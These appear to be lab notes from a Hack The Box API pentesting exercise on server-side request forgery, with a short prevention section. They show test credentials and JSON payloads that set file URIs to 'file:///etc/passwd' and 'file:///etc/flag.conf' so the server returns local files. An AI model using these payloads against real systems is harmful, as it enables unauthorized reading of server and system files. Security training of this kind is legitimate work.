CWE-918: Server Side Request Forgery (SSRF)

```
htbpentester10@pentestercompany.com:HTBPentester10
```
Roles:
- SupplierCompanies_Update, SupplierCompanies_UploadCertificateOfIncorporation
- /api/v1/supplier-companies, /api/v1/supplier-companies/{ID}/certificates-of-incorporation, /api/v1/supplier-companies/certificates-of-incorporation

**/api/v1/supplier-companies/certificates-of-incorporation
After sending a request, the response shows the fileURI.

**/api/v1/supplier-companies PATCH
We can modify the CertificateOfIncorporationPDFFileURI to point to "file:///etc/passwd"

**/api/v1/supplier-companies/{ID}/certificates-of-incorporation GET
Fetch the file using the ID


**Prevention
- Both the POST and PATCH endpoints must strictly prohibit file URIs that point to local resources on the server other than the intended ones.
- The GET endpoint must be configured to serve content exlucsively from the designated folder.

```
{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation",
    "Products_CreateByCurrentUser",
    "Products_Update",
    "Products_UploadPhoto"
  ]
}

{
  "supplier": {
    "id": "5d489453-3538-4973-9479-2c37b2a5db73",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester11",
    "email": "htbpentester11@pentestercompany.com",
    "phoneNumber": "+44 9998 999992"
  }
}
```
Endpoints accessible: /api/v1/products/current-user POST, /api/v1/products, /api/v1/products/photo
- Created a new product with ID: 83544c84-95a8-4663-a64e-acfab5e701b3
- Uploaded a photo
```
{
  "successStatus": true,
  "fileURI": "file:///app/wwwroot/ProductsPhotos/OG_AcademyHomepage-2248097595.png",
  "fileSize": 234111
}
```

Updated the product with different URI
```
{
  "UpdatedProduct": {
    "SupplierID": "5d489453-3538-4973-9479-2c37b2a5db73",
    "ProductID": "83544c84-95a8-4663-a64e-acfab5e701b3",
    "Name": "hello",
    "Price": 6,
    "PNGPhotoFileURI": "file:///etc/flag.conf"
  }
}
```
